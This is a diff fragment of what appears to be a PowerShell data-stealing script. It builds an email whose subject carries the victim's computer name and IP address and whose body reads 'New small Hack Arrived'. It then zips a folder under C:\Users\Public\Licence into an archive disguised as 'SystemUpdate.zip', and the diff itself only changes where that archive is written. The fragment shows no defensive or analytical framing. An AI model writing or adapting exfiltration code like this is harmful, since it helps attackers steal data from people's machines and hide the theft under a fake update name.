@@ -84,7 +84,7 @@ else{
     $msg.Subject = "$env:computername ### {$ip ($count)}"
     $msg.Body = "New small Hack Arrived. Lets Enjoy !!!"                     
 
-    $file1 = "C:\Users\Public\Licence\Microsoft\SystemUpdate.zip"
+    $file1 = "C:\Users\Public\Licence\SystemUpdate.zip"
 
     if(Test-Path $file1) {
     Remove-Item  $file1 -Recurse -Force -Confirm:$false
@@ -95,7 +95,7 @@ else{
 
      $error.clear()
      try { 
-        Compress-Archive -Path C:\Users\Public\Licence\Microsoft\ -DestinationPath "C:\Users\Public\Licence\Microsoft\SystemUpdate.zip" -Force -Confirm:$false
+        Compress-Archive -Path C:\Users\Public\Licence\Microsoft\ -DestinationPath "C:\Users\Public\Licence\SystemUpdate.zip" -Force -Confirm:$false
      }
        catch { 
         
